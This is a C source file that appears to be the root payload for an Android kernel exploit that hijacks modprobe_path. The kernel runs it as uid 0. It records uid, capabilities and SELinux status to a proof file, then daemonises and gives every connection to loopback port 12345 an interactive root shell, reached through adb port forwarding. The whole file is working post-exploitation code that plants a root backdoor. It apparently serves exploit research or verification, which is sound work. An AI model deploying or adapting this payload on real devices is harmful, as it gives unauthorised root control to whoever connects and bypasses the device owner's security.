#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/stat.h>
#include <sys/wait.h>
#include <netinet/in.h>
#include <arpa/inet.h>

/* Payload the kernel execs via modprobe_path (runs as uid 0, kmod context).
 * kmod invokes it as: rootsh -c /dev/null  -> args are ignored on purpose.
 * What it does:
 *   1. drops a proof file (uid, caps, getenforce) so a shell can read it
 *   2. detaches and listens on TCP 12345; every accept forks an interactive
 *      root sh -> reached from the PC with: adb forward tcp:12345 tcp:12345
 * Nothing is written outside /data/local/tmp; a reboot removes all of it.
 */
#define PORT 12345
#define PROOF "/data/local/tmp/rootsh.ok"

static void dump_proof(void)
{
    char buf[512];
    pid_t pid = getpid();
    int n = snprintf(buf, sizeof buf,
                     "rootsh alive pid=%d uid=%d euid=%d gid=%d egid=%d\n",
                     pid, getuid(), geteuid(), getgid(), getegid());
    int fd = open(PROOF, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd >= 0) {
        FILE *f;
        write(fd, buf, n);
        f = popen("cat /proc/self/status | grep -E \"Uid|Gid|CapEff|CapBnd\"; getenforce", "r");
        if (f) {
            char l[256];
            while (fgets(l, sizeof l, f)) write(fd, l, strlen(l));
            pclose(f);
        }
        close(fd);
        chmod(PROOF, 0644);
    }
}

int main(int argc, char **argv)
{
    int ls, fd;
    struct sockaddr_in a;

    dump_proof();

    if (fork() > 0)
        return 0;                      /* let kmod's wait return */
    setsid();
    if (fork() > 0)
        return 0;

    ls = socket(AF_INET, SOCK_STREAM, 0);
    if (ls < 0)
        return 1;
    { int on = 1; setsockopt(ls, SOL_SOCKET, SO_REUSEADDR, &on, sizeof on); }
    memset(&a, 0, sizeof a);
    a.sin_family = AF_INET;
    a.sin_addr.s_addr = htonl(INADDR_LOOPBACK);
    a.sin_port = htons(PORT);
    if (bind(ls, (struct sockaddr *)&a, sizeof a) < 0)
        return 2;
    if (listen(ls, 4) < 0)
        return 3;

    for (;;) {
        fd = accept(ls, NULL, NULL);
        if (fd < 0)
            continue;
        if (fork() == 0) {
            setsid();
            dup2(fd, 0); dup2(fd, 1); dup2(fd, 2);
            if (fd > 2)
                close(fd);
            setenv("HOME", "/data/local/tmp", 1);
            setenv("PATH", "/sbin:/system/bin:/system/xbin", 1);
            /* no -i: an interactive sh prints a job-control warning and a shell
             * prompt onto the socket, and verify_root.sh reads its first line as
             * the value of `id -u` -- the banner became the "result".  A plain sh
             * on a socket still gives a full session for manual use. */
            execl("/system/bin/sh", "sh", (char *)0);
            _exit(127);
        }
        close(fd);
    }
    return 0;
}
